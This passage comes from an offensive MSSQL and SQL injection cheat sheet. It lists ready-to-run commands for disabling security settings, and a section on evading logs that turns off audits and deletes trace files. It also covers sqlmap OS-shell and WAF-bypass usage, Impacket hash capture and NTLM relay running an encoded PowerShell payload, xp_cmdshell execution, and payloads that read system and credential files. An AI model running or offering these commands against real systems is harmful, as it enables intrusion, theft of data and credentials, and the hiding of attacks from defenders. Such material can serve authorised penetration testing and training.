EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
EXEC sp_configure 'clr enabled',1; RECONFIGURE;

-- Bypass OLE Automation Restrictions
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;

-- Bypass Linked Server Restrictions
EXEC sp_serveroption 'linked_server', 'rpc out', 'true';
EXEC sp_serveroption 'linked_server', 'data access', 'true';

-- Bypass Database Restrictions
ALTER DATABASE database_name SET TRUSTWORTHY ON;
ALTER DATABASE database_name SET DB_CHAINING ON;
```

### 🔹 Logging Evasion Techniques
```sql
-- Disable SQL Server Audit
ALTER SERVER AUDIT audit_name WITH (STATE = OFF);

-- Disable Database Audit
ALTER DATABASE AUDIT SPECIFICATION audit_spec_name WITH (STATE = OFF);

-- Clear Error Logs
EXEC sp_cycle_errorlog;

-- Disable Trace Flags
DBCC TRACEOFF(1222,-1);
DBCC TRACEOFF(3605,-1);

-- Bypass Login Auditing
EXEC sp_configure 'login audit', 0; RECONFIGURE;

-- Hide Activities
EXEC xp_cmdshell 'del /f /q C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\Log\*.trc';
```

## Tooling & Automation

### SQLMap Usage
```bash
# Basic SQLMap Commands
sqlmap -u "http://target/page.php?id=1" --dbs  # List databases
sqlmap -u "http://target/page.php?id=1" -D dbname --tables  # List tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump  # Dump table
sqlmap -u "http://target/page.php?id=1" --current-user  # Current user
sqlmap -u "http://target/page.php?id=1" --is-dba  # Check if DBA

# Advanced SQLMap Options
sqlmap -u "http://target/page.php?id=1" --technique=BEUST  # Specify techniques
sqlmap -u "http://target/page.php?id=1" --level=5 --risk=3  # Maximum level/risk
sqlmap -u "http://target/page.php?id=1" --os-shell  # Get OS shell
sqlmap -u "http://target/page.php?id=1" --sql-shell  # Get SQL shell

# WAF Bypass
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,randomcase
sqlmap -u "http://target/page.php?id=1" --tamper=charencode,randomcomments
```

### 🔹 PowerShell SQL Attack Scripts
```powershell
# SQL Server Discovery Script
function Find-SQLServers {
    param($Domain)
    setspn -T $Domain -Q MSSQLSvc/* | Where-Object {$_ -match "MSSQLSvc"}
}

# SQL Server Authentication Test
function Test-SQLAuth {
    param($Server, $Database = "master")
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection
        $conn.ConnectionString = "Server=$Server;Database=$Database;Integrated Security=True;"
        $conn.Open()
        Write-Host "Authentication successful to $Server"
        $conn.Close()
        return $true
    } catch {
        Write-Host "Authentication failed to $Server"
        return $false
    }
}

# SQL Server Enumeration
function Enumerate-SQLServer {
    param($Server)
    $conn = New-Object System.Data.SqlClient.SqlConnection
    $conn.ConnectionString = "Server=$Server;Database=master;Integrated Security=True;"
    $conn.Open()
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT SYSTEM_USER"
    $user = $cmd.ExecuteScalar()
    
    $cmd.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
    $isadmin = $cmd.ExecuteScalar()
    
    Write-Host "Server: $Server"
    Write-Host "User: $user"
    Write-Host "Sysadmin: $isadmin"
    
    $conn.Close()
}
```

### 🔹 C# Applications for SQL Attacks
```csharp
// SQL Server Connection and Enumeration
using System;
using System.Data.SqlClient;

class SQLEnumerator {
    static void Main(string[] args) {
        String sqlServer = "dc01.corp1.com";
        String database = "master";
        String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
        
        SqlConnection con = new SqlConnection(conString);
        
        try {
            con.Open();
            Console.WriteLine("Auth success!");
            
            // Get current user
            String query = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing as: " + reader[0]);
            reader.Close();
            
            // Check sysadmin role
            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Sysadmin: " + reader[0]);
            reader.Close();
            
        } catch {
            Console.WriteLine("Auth failed");
        }
        
        con.Close();
    }
}
```

### 🔹 Impacket Integration for SQL Attacks
```bash
# SQL Server Authentication Testing
impacket-mssqlclient -port 1433 dc01.corp1.com

# Hash Capture Setup
impacket-smbserver share /tmp/share

# NTLM Relay Setup
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.6 -c 'powershell -enc payload'

# MSSQL Command Execution
impacket-mssqlclient dc01.corp1.com -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Linked Server Enumeration
impacket-mssqlclient dc01.corp1.com -windows-auth
SQL> SELECT * FROM master..sysservers;
```

## Comment Techniques

```sql
--  # Standard line comment (SQL)
#  # MySQL line comment
/**/  # Inline comment (multiple DBs)
/*!50001 SELECT * FROM users*/  # MySQL version-specific comment
--+-  # Alternative comment
;%00  # Null byte comment
```

## String Operations

```sql
CHAR(75)+CHAR(76)+CHAR(77)  # [MSSQL] Create string 'KLM' without quotes
CHR(75)||CHR(76)||CHR(77)  # [Oracle] Create string 'KLM' without quotes
0x446F672021  # [MySQL] Hex string 'Dog!'
CONCAT('a','b','c')  # [MySQL] String concatenation
'a' + 'b' + 'c'  # [MSSQL] String concatenation
'a' || 'b' || 'c'  # [Oracle/PostgreSQL] String concatenation
ASCII('a')  # Get ASCII value [All]
SUBSTRING('text',1,1)  # Extract single char [All]

# Caveat: String operations may fail if:
# - Database has string length limitations
# - Special characters are filtered/escaped
# - Collation settings affect string comparison

## Column Discovery

```sql
ORDER BY 1--  # Find column count
' HAVING 1=1--  # Error reveals first column
' GROUP BY table.column1 HAVING 1=1--  # Error reveals next column
' UNION SELECT NULL,NULL,NULL--  # Test column count and types
SELECT * FROM users WHERE id = -1 UNION ALL SELECT null, null, convert(image,1)  # Test column types
```

## Database Version

```sql
SELECT @@version  # MSSQL version
SELECT version()  # PostgreSQL/MySQL version
SELECT banner FROM v$version  # Oracle version
SELECT sqlite_version()  # SQLite version
/*!50001 SELECT * FROM users*/  # MySQL version check
SELECT SERVERPROPERTY('ProductVersion')  # Detailed MSSQL version
```

## File Operations

```sql
# Basic File Operations
SELECT LOAD_FILE('/etc/passwd')  # [MySQL] Read file from filesystem
SELECT TO_CHAR(DBMS_XMLGEN.getXML('select * from v$version'))  # [Oracle] Read file using XML generation
EXEC xp_cmdshell 'type c:\boot.ini'  # [MSSQL] Read file using command shell

# Advanced File Operations [MSSQL]
CREATE TABLE mydata(line VARCHAR(8000));BULK INSERT mydata FROM 'c:\windows\win.ini'  # Bulk file read into table
SELECT * FROM OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=C:\windows\system32\ias\ias.mdb','SELECT * FROM admin')  # Read Access database file
BACKUP DATABASE master TO DISK='C:\temp\backup.bak'  # Force database backup to file
RESTORE VERIFYONLY FROM DISK='C:\windows\system32\config\SAM'  # Test file accessibility

# BULK INSERT Error Enumeration [MSSQL]
BULK INSERT mydata FROM 'nonexistent_file'  # Error shows file access context
BULK INSERT mydata FROM '\\nonexistent\share\file'  # Test network share access
DECLARE @file VARCHAR(8000);SET @file=(SELECT TOP 1 path FROM sys.traces);BULK INSERT test FROM @file  # Read SQL trace file

# Caveat: File operations may fail if:
# - Database has file system access restrictions
# - SQL Server runs under limited service account
# - File permissions are not granted to database user
# - Network access is blocked by firewall
# - File paths contain special characters that need escaping

## Advanced MSSQL Stored Procedures

```sql
EXEC xp_servicecontrol 'start','MSSQLSERVER'  # [MSSQL] Control SQL Server service
EXEC xp_availablemedia  # [MSSQL] List available drives/media
EXEC xp_enumdsn  # [MSSQL] List ODBC data sources
EXEC xp_loginconfig  # [MSSQL] Get authentication configuration
EXEC xp_makecab 'c:\file.cab'  # [MSSQL] Create CAB archive file
EXEC xp_ntsec_enumdomains  # [MSSQL] Enumerate Windows domains
EXEC xp_terminate_process 1234  # [MSSQL] Kill process by PID
EXEC xp_regread HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName'  # [MSSQL] Read registry value
sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'  # [MSSQL] Add custom extended stored procedure
EXEC sp_makewebtask 'c:\inetpub\wwwroot\test.html', 'SELECT * FROM users'  # [MSSQL] Write query results to HTML file

# Caveat: Advanced stored procedures may fail if:
# - xp_cmdshell is disabled by default in MSSQL 2005+
# - User lacks sysadmin role membership
# - Stored procedures are removed or disabled
# - Database compatibility level is too low

## Data Extraction

```sql
GROUP_CONCAT(column_name)  # [MySQL] Concatenate rows into single string
STRING_AGG(column_name,',')  # [MSSQL] Concatenate rows into single string
LISTAGG(column_name,',')  # [Oracle] Concatenate rows into single string
SELECT * FROM master..sysmessages  # [MSSQL] System error messages
SELECT * FROM master..sysservers  # [MSSQL] Linked servers
SELECT * FROM sys.sql_logins  # [MSSQL] SQL Server 2005+ logins

# Caveat: Data extraction may fail if:
# - Database has query result limits
# - Large datasets cause timeouts
# - Sensitive data is encrypted or obfuscated
# - Network bandwidth limits data transfer

## Time-Based

```sql
IF(1=1,SLEEP(5),'false')  # [MySQL] Delay for 5 seconds if true
WAITFOR DELAY '0:0:5'  # [MSSQL] Delay for 5 seconds if true
DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)  # [Oracle] Delay using DBMS_PIPE
pg_sleep(5)  # [PostgreSQL] Delay using pg_sleep function
DECLARE @start datetime;SET @start=GETDATE();WAITFOR DELAY '0:0:5';SELECT DATEDIFF(second,@start,GETDATE())  # [MSSQL] Precise timing measurement

# Caveat: Time-based injection may fail if:
# - Database has query timeouts disabled
# - Network latency interferes with timing measurements
# - Application implements request rate limiting
# - Database caches query results
# - Server load affects timing consistency

## Conditional Logic

```sql
IF(1=1,'true','false')  # [MySQL] Conditional IF statement
CASE WHEN 1=1 THEN 'true' ELSE 'false' END  # [MSSQL/PostgreSQL] Conditional CASE statement
DECODE(1,1,'true','false')  # [Oracle] DECODE function for conditional logic
IS_SRVROLEMEMBER('sysadmin')  # [MSSQL] Check if user has sysadmin role
IS_MEMBER('db_owner')  # [MSSQL] Check if user is database owner role member

# Caveat: Conditional logic may fail if:
# - Database doesn't support conditional functions
# - Query optimizer bypasses conditions
# - Application filters conditional keywords

## System Enumeration

```sql
# Host and Network Info [MSSQL]
EXEC xp_cmdshell 'ipconfig /all'  # Network configuration
EXEC xp_cmdshell 'netstat -an'  # Open ports
SELECT HOST_NAME()  # SQL Server hostname
SELECT @@SERVERNAME  # Server instance name

# Service Enumeration [MSSQL]
EXEC xp_servicecontrol 'query','MSSQLSERVER'  # Check specific service
EXEC master..xp_cmdshell 'sc query state= all'  # List all services
EXEC master..xp_cmdshell 'tasklist /v'  # Running processes

# Registry Deep Dive [MSSQL]
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER'  # SQL service config
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','SystemRoot'  # Windows directory
EXEC xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion'  # Enumerate values

# Caveat: System enumeration may fail if:
# - xp_cmdshell is disabled or restricted
# - User lacks sysadmin privileges
# - Windows firewall blocks command execution
# - Antivirus software blocks system commands

## Advanced System Access

```sql
EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''server=target;uid=sa;pwd=pass'',''SELECT 1'')')  # [MSSQL] Remote connection via OLE DB
EXEC('SELECT * FROM OPENDATASOURCE(''SQLOLEDB'',''Data Source=target;User ID=sa;Password=pass'').database.dbo.table')  # [MSSQL] Remote table access
SELECT * FROM OPENQUERY(linked_server,'SELECT @@version')  # [MSSQL] Query linked server

# Caveat: Advanced system access may fail if:
# - Linked servers are not configured or accessible
# - Remote SQL servers block connections
# - Network firewalls block SQL ports
# - Authentication credentials are required but not available
